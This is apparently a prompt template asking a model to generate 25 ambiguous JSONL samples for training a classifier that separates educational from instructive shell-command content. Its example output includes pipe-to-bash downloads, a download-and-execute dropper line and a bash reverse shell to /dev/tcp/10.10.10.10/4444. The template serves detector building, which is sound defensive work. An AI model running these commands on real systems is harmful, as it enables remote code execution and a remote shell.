# Task: Generate Edge Case / Ambiguous Samples

You are generating training data for a machine learning model. Generate EDGE CASES - ambiguous content that tests the boundaries between educational and malicious. These help the model learn nuanced distinctions.

Generate **25 unique samples** of edge cases with appropriate labels.

## Output Format

Output valid JSONL (one JSON object per line). Do NOT include any other text, explanations, or markdown formatting - ONLY the JSONL lines:

```
{"text": "content here", "label": "educational|command|text", "segment_type": "code|text"}
```

## Edge Case Categories

### 1. Weak Educational Context (5 samples) → label: "educational"
Commands with minimal but present warning language. The warning is there but not strong.
- "Note: this can be risky"
- "Be careful with this"
- "This is a sensitive command"

### 2. Commands in Questions (5 samples) → label: "text"
Questions ABOUT commands, not instructions TO run them.
- "What does `curl x | bash` do?"
- "Can someone explain this command?"
- "Is this script safe to run?"

### 3. Historical/Past Tense (5 samples) → label: "educational"
Describing what happened, not instructing what to do.
- "The attacker used..."
- "We found that the malware executed..."
- "The breach occurred when someone ran..."

### 4. Conditional Instructions (5 samples) → label: "command"
Still instructions, just conditional.
- "If you want to X, run Y"
- "To achieve X, you can use Y"
- "When you need to X, execute Y"

### 5. Code Review / Analysis (5 samples) → label: "educational"
Analyzing existing code, not providing instructions.
- "Looking at this script, we can see..."
- "This code contains the following vulnerability..."
- "Let me analyze what this command does..."

## Requirements

- Make the edge cases genuinely ambiguous (not obviously one or the other)
- Include the reasoning in subtle contextual cues
- Vary the command types (curl, wget, rm, powershell, etc.)
- Use proper newlines with \n in JSON strings

## Example Output Format

```jsonl
{"text": "Note: this command can be risky if you don't know what you're doing:\n\n```bash\ncurl example.com/script.sh | bash\n```\n\nMake sure you trust the source.", "label": "educational", "segment_type": "code"}
{"text": "Can someone explain what this command does?\n\n```bash\nwget -qO- http://site.com/install.sh | sh\n```\n\nI found it in a tutorial but I'm not sure if it's safe.", "label": "text", "segment_type": "code"}
{"text": "During the incident, we discovered the attacker had executed:\n\n```bash\n/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\n```\n\nThis established a reverse shell to their C2 server.", "label": "educational", "segment_type": "code"}
{"text": "If you want to quickly set up the environment, you can run:\n\n```bash\ncurl -sL https://setup.io/install | bash\n```\n\nThis will configure everything automatically.", "label": "command", "segment_type": "code"}
{"text": "Let me analyze this script that was submitted for review:\n\n```bash\nwget http://updates.internal/patch.sh -O /tmp/patch.sh && chmod +x /tmp/patch.sh && /tmp/patch.sh\n```\n\nThis downloads a file, makes it executable, and runs it - a common pattern for malware droppers.", "label": "educational", "segment_type": "code"}
```

---

**OUTPUT ONLY JSONL LINES - NO OTHER TEXT**

Generate 25 edge case samples now:

